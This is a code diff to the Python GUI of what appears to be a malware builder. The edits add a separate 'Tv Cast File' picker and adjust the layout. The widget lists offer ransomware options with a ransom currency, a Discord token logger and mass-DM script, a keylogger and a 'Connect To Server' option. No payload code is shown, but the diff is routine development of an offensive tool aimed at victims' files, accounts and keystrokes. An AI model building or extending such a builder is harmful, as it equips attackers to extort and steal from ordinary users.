@@ -105,12 +105,22 @@ class Frame(customtkinter.CTkFrame):
                 continue
 
             else:
-                self.icon = tkinter.StringVar(value="")
+                extension = "ico" if title == "File Icon" else "mp4"
 
-                widget = widget_type(master=self, text=title, command=lambda: self.file_prompt("ico" if title == "File Icon" else "mp4"))
-                widget.grid(row=x, column=2, sticky="nsew")
+                if extension == "ico":
+                    self.icon = tkinter.StringVar(value="")
 
-                widgets[title] = self.icon
+                else:
+                    self.cast_file = tkinter.StringVar(value="")
+
+                widget = widget_type(master=self, text=title, command=lambda: self.file_prompt(extension))
+                widget.grid(row=x, column=2, sticky="ew")
+
+                if extension == "ico":
+                    widgets[title] = self.icon
+
+                else:
+                    widgets[title] = self.cast_file
 
                 continue
                 
@@ -141,7 +151,11 @@ class Frame(customtkinter.CTkFrame):
             initialdir='/',
             filetypes=filetypes)
 
-        self.icon.set(filename)
+        if extension == "ico":
+            self.icon.set(filename)
+
+        else:
+            self.cast_file.set(filename)
 
 class App(customtkinter.CTk):
     def __init__(self):
@@ -198,7 +212,7 @@ class App(customtkinter.CTk):
             self.key = key
 
             for child in self.winfo_children()[1:]:
-                child.destroy() # Abortion clinic
+                child.destroy()
 
             self.menu()
 
@@ -233,7 +247,7 @@ class App(customtkinter.CTk):
             "Currency": customtkinter.CTkOptionMenu
         }
         
-        ransom_frame = Frame(master=main_frame, widgets=ransomware_widgets, row=0, column=11, columnspan=3, rowspan=10, pady=0, padx=20, intonly=[1, 2, 4])
+        ransom_frame = Frame(master=main_frame, widgets=ransomware_widgets, row=0, column=11, columnspan=3, rowspan=14, pady=0, padx=20, intonly=[1, 2, 4])
 
         discord_widgets = {
             "Token Logger": customtkinter.CTkCheckBox,
@@ -242,7 +256,7 @@ class App(customtkinter.CTk):
             "MassDM Script": customtkinter.CTkEntry
         }
         
-        discord_frame = Frame(master=main_frame, widgets=discord_widgets, row=0, column=8, columnspan=3, rowspan=10, pady=0, padx=20)
+        discord_frame = Frame(master=main_frame, widgets=discord_widgets, row=0, column=8, columnspan=3, rowspan=14, pady=0, padx=20)
 
         connection_widgets = {
             "Connect To Server": customtkinter.CTkCheckBox,
@@ -253,7 +267,7 @@ class App(customtkinter.CTk):
             "Tv Cast File": customtkinter.CTkButton,
         }
         
-        connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=10, pady=10, padx=20)
+        connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=14, pady=0, padx=20)
 
         misc_widgets = {
             "Key Logger": customtkinter.CTkCheckBox,
